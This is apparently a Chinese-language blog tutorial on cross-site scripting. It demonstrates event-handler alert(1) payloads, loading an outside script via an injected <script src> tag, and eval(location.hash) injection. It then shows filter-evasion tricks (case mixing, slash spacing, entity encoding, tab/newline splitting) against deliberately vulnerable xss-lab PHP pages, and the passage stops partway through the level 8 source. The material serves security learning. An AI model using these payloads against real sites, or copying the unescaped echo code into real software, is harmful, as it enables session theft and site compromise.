<p>在输入框回车就弹窗了或者随便按一个键盘的键就触发了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127100842.png"></p>
<h3 id="onkeyup事件属性"><a href="#onkeyup事件属性" class="headerlink" title="onkeyup事件属性"></a>onkeyup事件属性</h3><p><code>onkeyup</code> 事件会在键盘按键被松开时发生</p>
<p>支持该事件的 HTML 标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>, <span class="tag">&lt;<span class="name">acronym</span>&gt;</span>, <span class="tag">&lt;<span class="name">address</span>&gt;</span>, <span class="tag">&lt;<span class="name">area</span>&gt;</span>, <span class="tag">&lt;<span class="name">b</span>&gt;</span>, <span class="tag">&lt;<span class="name">bdo</span>&gt;</span>, <span class="tag">&lt;<span class="name">big</span>&gt;</span>, <span class="tag">&lt;<span class="name">blockquote</span>&gt;</span>, <span class="tag">&lt;<span class="name">body</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>, <span class="tag">&lt;<span class="name">caption</span>&gt;</span>, <span class="tag">&lt;<span class="name">cite</span>&gt;</span>, <span class="tag">&lt;<span class="name">code</span>&gt;</span>, <span class="tag">&lt;<span class="name">dd</span>&gt;</span>, <span class="tag">&lt;<span class="name">del</span>&gt;</span>, <span class="tag">&lt;<span class="name">dfn</span>&gt;</span>, <span class="tag">&lt;<span class="name">div</span>&gt;</span>, <span class="tag">&lt;<span class="name">dt</span>&gt;</span>, <span class="tag">&lt;<span class="name">em</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span>, <span class="tag">&lt;<span class="name">form</span>&gt;</span>, <span class="tag">&lt;<span class="name">h1</span>&gt;</span> to <span class="tag">&lt;<span class="name">h6</span>&gt;</span>, <span class="tag">&lt;<span class="name">hr</span>&gt;</span>, <span class="tag">&lt;<span class="name">i</span>&gt;</span>, <span class="tag">&lt;<span class="name">input</span>&gt;</span>, <span class="tag">&lt;<span class="name">kbd</span>&gt;</span>, <span class="tag">&lt;<span class="name">label</span>&gt;</span>, <span class="tag">&lt;<span class="name">legend</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>, <span class="tag">&lt;<span class="name">map</span>&gt;</span>, <span class="tag">&lt;<span class="name">object</span>&gt;</span>, <span class="tag">&lt;<span class="name">ol</span>&gt;</span>, <span class="tag">&lt;<span class="name">p</span>&gt;</span>, <span class="tag">&lt;<span class="name">pre</span>&gt;</span>, <span class="tag">&lt;<span class="name">q</span>&gt;</span>, <span class="tag">&lt;<span class="name">samp</span>&gt;</span>, <span class="tag">&lt;<span class="name">select</span>&gt;</span>, <span class="tag">&lt;<span class="name">small</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>, <span class="tag">&lt;<span class="name">strong</span>&gt;</span>, <span class="tag">&lt;<span class="name">sub</span>&gt;</span>, <span class="tag">&lt;<span class="name">sup</span>&gt;</span>, <span class="tag">&lt;<span class="name">table</span>&gt;</span>, <span class="tag">&lt;<span class="name">tbody</span>&gt;</span>, <span class="tag">&lt;<span class="name">td</span>&gt;</span>, <span class="tag">&lt;<span class="name">textarea</span>&gt;</span>, <span class="tag">&lt;<span class="name">tfoot</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>, <span class="tag">&lt;<span class="name">thead</span>&gt;</span>, <span class="tag">&lt;<span class="name">tr</span>&gt;</span>, <span class="tag">&lt;<span class="name">tt</span>&gt;</span>, <span class="tag">&lt;<span class="name">ul</span>&gt;</span>, <span class="tag">&lt;<span class="name">var</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="下面是我的测试-5"><a href="#下面是我的测试-5" class="headerlink" title="下面是我的测试"></a><strong>下面是我的测试</strong></h4><p><strong><code>&lt;input&gt;</code>标签表单元素弹窗</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onkeyup</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我输入任何一个东西松开的时候就会弹窗<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127102115.png"></p>
<h3 id="onclick事件属性"><a href="#onclick事件属性" class="headerlink" title="onclick事件属性"></a>onclick事件属性</h3><p><code>onclick</code> 事件会在对象被点击时发生。<br>支持该事件的 HTML 标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>, <span class="tag">&lt;<span class="name">address</span>&gt;</span>, <span class="tag">&lt;<span class="name">area</span>&gt;</span>, <span class="tag">&lt;<span class="name">b</span>&gt;</span>, <span class="tag">&lt;<span class="name">bdo</span>&gt;</span>, <span class="tag">&lt;<span class="name">big</span>&gt;</span>, <span class="tag">&lt;<span class="name">blockquote</span>&gt;</span>, <span class="tag">&lt;<span class="name">body</span>&gt;</span>, <span class="tag">&lt;<span class="name">button</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">caption</span>&gt;</span>, <span class="tag">&lt;<span class="name">cite</span>&gt;</span>, <span class="tag">&lt;<span class="name">code</span>&gt;</span>, <span class="tag">&lt;<span class="name">dd</span>&gt;</span>, <span class="tag">&lt;<span class="name">dfn</span>&gt;</span>, <span class="tag">&lt;<span class="name">div</span>&gt;</span>, <span class="tag">&lt;<span class="name">dl</span>&gt;</span>, <span class="tag">&lt;<span class="name">dt</span>&gt;</span>, <span class="tag">&lt;<span class="name">em</span>&gt;</span>, <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span>, <span class="tag">&lt;<span class="name">h1</span>&gt;</span> to <span class="tag">&lt;<span class="name">h6</span>&gt;</span>, <span class="tag">&lt;<span class="name">hr</span>&gt;</span>, <span class="tag">&lt;<span class="name">i</span>&gt;</span>, <span class="tag">&lt;<span class="name">img</span>&gt;</span>, <span class="tag">&lt;<span class="name">input</span>&gt;</span>, <span class="tag">&lt;<span class="name">kbd</span>&gt;</span>, <span class="tag">&lt;<span class="name">label</span>&gt;</span>, <span class="tag">&lt;<span class="name">legend</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>, <span class="tag">&lt;<span class="name">map</span>&gt;</span>, <span class="tag">&lt;<span class="name">object</span>&gt;</span>, <span class="tag">&lt;<span class="name">ol</span>&gt;</span>, <span class="tag">&lt;<span class="name">p</span>&gt;</span>, <span class="tag">&lt;<span class="name">pre</span>&gt;</span>, <span class="tag">&lt;<span class="name">samp</span>&gt;</span>, <span class="tag">&lt;<span class="name">select</span>&gt;</span>, <span class="tag">&lt;<span class="name">small</span>&gt;</span>, <span class="tag">&lt;<span class="name">span</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>, <span class="tag">&lt;<span class="name">sub</span>&gt;</span>, <span class="tag">&lt;<span class="name">sup</span>&gt;</span>, <span class="tag">&lt;<span class="name">table</span>&gt;</span>, <span class="tag">&lt;<span class="name">tbody</span>&gt;</span>, <span class="tag">&lt;<span class="name">td</span>&gt;</span>, <span class="tag">&lt;<span class="name">textarea</span>&gt;</span>, <span class="tag">&lt;<span class="name">tfoot</span>&gt;</span>, <span class="tag">&lt;<span class="name">th</span>&gt;</span>, </span><br><span class="line"><span class="tag">&lt;<span class="name">thead</span>&gt;</span>, <span class="tag">&lt;<span class="name">tr</span>&gt;</span>, <span class="tag">&lt;<span class="name">tt</span>&gt;</span>, <span class="tag">&lt;<span class="name">ul</span>&gt;</span>, <span class="tag">&lt;<span class="name">var</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="下面是我的测试-6"><a href="#下面是我的测试-6" class="headerlink" title="下面是我的测试"></a><strong>下面是我的测试</strong></h4><p><strong><code>&lt;a&gt;</code>标签定义超链接弹窗</strong><br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span> &gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>点击一下点我他就弹窗了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127103105.png"><br>**<code>&lt;input&gt;</code>标签表单元素弹窗**<br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>点击输入框就弹窗了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127103923.png"></p>
<p><strong><code>&lt;img&gt;</code>图片标签</strong><br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://www.baidu.com/img/flexible/logo/pc/result.png&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
<p>点击百度的照片他就会触发弹窗<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127103740.png"></p>
<h3 id="onselect事件属性"><a href="#onselect事件属性" class="headerlink" title="onselect事件属性"></a>onselect事件属性</h3><p><code>onselect</code> 事件会在文本框中的文本被选中时发生<br>支持该事件的 HTML 标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span>, <span class="tag">&lt;<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="下面是我的测试-7"><a href="#下面是我的测试-7" class="headerlink" title="下面是我的测试"></a><strong>下面是我的测试</strong></h4><p><strong><code>&lt;input&gt;</code>标签表单元素弹窗</strong><br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onselect</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们选择他就弹窗了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127105304.png"></p>
<h3 id="oninput事件属性"><a href="#oninput事件属性" class="headerlink" title="oninput事件属性"></a>oninput事件属性</h3><p><code>oninput</code> 事件在用户输入时触发</p>
<h4 id="下面是我的测试-8"><a href="#下面是我的测试-8" class="headerlink" title="下面是我的测试"></a><strong>下面是我的测试</strong></h4><p><strong><code>&lt;input&gt;</code>标签表单元素弹窗</strong><br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">oninput</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>输入一个a就弹窗了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127110215.png"></p>
<h3 id="onmousemove事件属性"><a href="#onmousemove事件属性" class="headerlink" title="onmousemove事件属性"></a>onmousemove事件属性</h3><p><code>onmousemove</code>事件会在鼠标指针移到指定的对象时发生<br>支持<strong>不</strong>该事件的 HTML 标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span>&gt;</span>, <span class="tag">&lt;<span class="name">bdo</span>&gt;</span>, <span class="tag">&lt;<span class="name">br</span>&gt;</span>, <span class="tag">&lt;<span class="name">head</span>&gt;</span>, <span class="tag">&lt;<span class="name">html</span>&gt;</span>, <span class="tag">&lt;<span class="name">iframe</span>&gt;</span>, <span class="tag">&lt;<span class="name">meta</span>&gt;</span>, <span class="tag">&lt;<span class="name">param</span>&gt;</span>, <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">, <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml">, and <span class="tag">&lt;<span class="name">title</span>&gt;</span>.</span></span></span></span><br></pre></td></tr></table></figure>
<h4 id="下面是我的测试-9"><a href="#下面是我的测试-9" class="headerlink" title="下面是我的测试"></a><strong>下面是我的测试</strong></h4><p><strong><code>&lt;img&gt;</code>图片标签</strong><br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://www.baidu.com/img/flexible/logo/pc/result.png&quot;</span> <span class="attr">onmousemove</span>=<span class="string">&quot;alert(1)&quot;</span>  &gt;</span></span><br></pre></td></tr></table></figure>
<p>只要鼠标一碰就被执行<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201127115140.png"></p>
<h2 id="web引用js代码"><a href="#web引用js代码" class="headerlink" title="web引用js代码"></a>web引用js代码</h2><p>语法</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>  <span class="attr">src</span>=<span class="string">&quot;http://1.1.1.1/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>web服务器代码是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str=$_GET[<span class="string">&quot;a&quot;</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;你输入的是&quot;</span>.$str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>调用js的代码是</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201130082515.png"></p>
<p>我们这URL里面输入<code>&lt;script  src=&quot;http://127.0.0.1/a.js&quot;&gt;&lt;/script&gt;</code><br>他就会弹窗<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201130082638.png"></p>
<h2 id="winodws-location-hash弹窗"><a href="#winodws-location-hash弹窗" class="headerlink" title="winodws.location.hash弹窗"></a>winodws.location.hash弹窗</h2><h3 id="winodws-location-hash介绍"><a href="#winodws-location-hash介绍" class="headerlink" title="winodws.location.hash介绍"></a>winodws.location.hash介绍</h3><p>比如我们URL地址输入是<code>http://1.1.1.1/a.html#aaaaaa</code><br><code>winodws.location.hash</code>就会取<code>#aaaaaa</code>值<br><strong>实咧</strong><br>代码<br>下面代码<code>location.hash</code>取的值输出出来<br>但是他前面有一个<code>#</code>我们可以用<code>substr()</code>方法取字符串</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span>  a=location.hash;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span>  b=location.hash.substr(<span class="number">1</span>);</span></span><br><span class="line"><span class="javascript">		<span class="built_in">console</span>.log(a);</span></span><br><span class="line"><span class="javascript">		<span class="built_in">console</span>.log(b);</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们在浏览器输入<code>http://1.1.1.1/a.html#aaaaaa</code><br>结果可以看见叫<code>#aaaaaa</code>输出出来了<br><code>substr(1)</code>方法叫#给去掉了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201130084816.png"></p>
<h3 id="利用winodws-location-hash弹窗"><a href="#利用winodws-location-hash弹窗" class="headerlink" title="利用winodws.location.hash弹窗"></a>利用winodws.location.hash弹窗</h3><h4 id="我们测试"><a href="#我们测试" class="headerlink" title="我们测试"></a>我们测试</h4><p>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str=$_GET[<span class="string">&quot;a&quot;</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;你输入的是&quot;</span>.$str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们在URL里面输入<br>eval()意思是并执行其中的的 JavaScript 代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">eval</span>(location.hash.substr(<span class="number">1</span>));&lt;/script&gt;<span class="comment">#alert(&#x27;1&#x27;)</span></span><br></pre></td></tr></table></figure>
<p>可以看见他弹窗了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201130085518.png"></p>
<h2 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h2><h3 id="替换空格绕过检查"><a href="#替换空格绕过检查" class="headerlink" title="/替换空格绕过检查"></a><code>/</code>替换空格绕过检查</h3><p>列如<br><code>onmousemove</code>事件会在鼠标指针移到指定的对象时发生</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">&quot;https://www.baidu.com/img/flexible/logo/pc/result.png&quot;</span>/<span class="attr">onmousemove</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>还是只要一碰一样能弹窗</p>
<h3 id="大小写绕过检查"><a href="#大小写绕过检查" class="headerlink" title="大小写绕过检查"></a>大小写绕过检查</h3><p><strong>测试1</strong><br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">HrEf</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span> &gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>html是不区分大小写的他还是可以执行的<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201128084546.png"></p>
<h4 id="xss-level6"><a href="#xss-level6" class="headerlink" title="xss-level6"></a>xss-level6</h4><p>在<code>xss-level6</code>就是可以用大小写进行绕过<br>他的代码<br>他虽然过滤了都是没有进行大的过滤我们就可以进行大小写转换来绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level7.php?keyword=move up!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level6&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str2=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.$str6.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.strlen($str6).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>输入的代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">A</span> <span class="attr">HrEf</span>=<span class="string">&quot;javascript:alert(1);&quot;</span> &gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span>//</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201128111607.png"></p>
<p><strong>测试2</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">HrEf</span>=<span class="string">&quot;JaVaScRiPt:alert(1)&quot;</span> &gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>url也是不区分大小写的<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201128091225.png"></p>
<h3 id="无分号无引号"><a href="#无分号无引号" class="headerlink" title="无分号无引号"></a>无分号无引号</h3><p><strong>测试</strong><br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span> &gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>他也是可以弹窗的<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201128091650.png"></p>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>参考<a href="https://www.fujieace.com/penetration-test/xss-100.html">https://www.fujieace.com/penetration-test/xss-100.html</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">字符串 	ASCLL	&amp;#代表十进制 		&amp;#x代表十六进制</span><br><span class="line">A		65		<span class="symbol">&amp;#65;</span>				<span class="symbol">&amp;#x41;</span> </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(&#x27;a&#x27;)</span><br></pre></td></tr></table></figure>
<p>上面HTML编码后变成</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6c;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x29;</span></span><br></pre></td></tr></table></figure>
<p>最终代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x61;&amp;#x27;&amp;#x29;&quot;&gt;点我&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
<p>还是可以被执行的<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201128105252.png"></p>
<p>还可以用换行和TAB来进行绕过</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&amp;#9;</span>=TAB键</span><br><span class="line"><span class="symbol">&amp;#13;</span>=回车</span><br></pre></td></tr></table></figure>
<p>原代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span> &gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>编码后</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#9;</span>java<span class="symbol">&amp;#13;</span>sc<span class="symbol">&amp;#9;</span>rip<span class="symbol">&amp;#13;</span>t:aler<span class="symbol">&amp;#13;</span>t(1)&quot;</span> &gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面这个还是可以被执行的应为在url里面是不区分回车和TAB键<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201128110747.png"><br>更多查看这个原文件<a href="https://www.fujieace.com/penetration-test/xss-100.html">https://www.fujieace.com/penetration-test/xss-100.html</a></p>
<h4 id="xss-level8"><a href="#xss-level8" class="headerlink" title="xss-level8"></a>xss-level8</h4><p>他过滤的比较严但是我们编码就可以绕过了<br>源代码<br>下面的代码几乎叫全部给过滤掉了，我们就利用编码绕过检查</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level9.php?keyword=not bad!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level8&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 